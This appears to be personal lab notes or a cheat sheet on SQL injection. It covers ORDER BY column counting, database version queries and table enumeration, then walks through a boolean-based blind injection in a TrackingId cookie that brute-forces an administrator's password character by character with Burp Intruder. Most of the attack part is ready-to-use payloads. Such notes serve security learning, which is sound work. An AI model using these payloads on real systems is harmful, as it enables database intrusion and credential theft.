## Guess the number of columns using ORDER BY

```
# try a number until you get an error

' ORDER BY 1--
' ORDER BY 2--
...
```

> The first single quote closes the previous SQL input, allowing to enter a SQL command after it. The -- invalidate the following commands.

## Database type Query

- Microsoft, MySQL:  
  `SELECT @@version`
- Oracle:  
  `SELECT * FROM v$version`
- PostgreSQL:  
  `SELECT version()`

## Getting info about tables

```
# it doesn't work with oracle

SELECT * FROM information_schema.tables
```

## Blind SQL Injection

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities.

### 1. Check that the parameter is vulnerable to SQLi

```
# if the Cookie: TrackingId is TRUE, it returns "Welcome back!"

Cookie: TrackingId=xyz' and 1=1--

# check no "Welcome Back!" if FALSE

Cookie: TrackingId=xyz' and 1=2--
```

### 2. Check the existence of a user table

```
# without the LIMIT 1, the query would have print as much 'x' as the number of rows in users

Cookie: TrackingId=xyz' and (SELECT 'x' FROM users LIMIT 1)='x'--
SELECT 'x' FROM users
```

### 3. Confirm that username administrator exists users table

```
Cookie: TrackingId=xyz' and (SELECT username FROM users where username='administrator')='administrator'--
```

### 4. Enumerate the password of the administrator user

```
TRUE CASE

Cookie: TrackingId=xyz' and (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1)='administrator'--

FALSE CASE

Cookie: TrackingId=xyz' and (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>50)='administrator'--
```

It's possible to enumerate the length number by sending the request to the Intruder and using a Numbers paylod type. Then by checking the length of the response, we can deduce that the exact length is 20.

```
TEST CASE

Cookie: TrackingId=xyz' and (SELECT username FROM users WHERE username='administrator' and LENGTH(password)=20)='administrator'--

```

Now we know the exact length of the password, it's time to brute force it.

```
# we are going to use a sniper attack with a brute forcer payload type in order to try all the alphanumerical chars

Cookie: TrackingId=xyz' and (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

```

In order to discover the password faster, we are gonna use a Cluster Bomb attack for iterating on both the first index of the substring and the characters of the password.
